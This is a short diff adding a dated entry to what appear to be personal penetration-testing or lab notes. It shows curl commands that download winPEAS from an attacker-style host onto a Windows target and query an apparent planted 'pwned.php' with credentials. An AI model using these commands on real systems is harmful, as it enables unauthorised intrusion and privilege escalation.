@@ -56,3 +56,9 @@ curl -v $ip
 curl 10.10.16.20:8000/winPEASany_ofs.exe -o C:/Users/Public/win.exe
 ```
 
+### 2024-05-12-Sun
+
+```
+curl --user $username:$password $ip:$port/pwned.php
+```
+
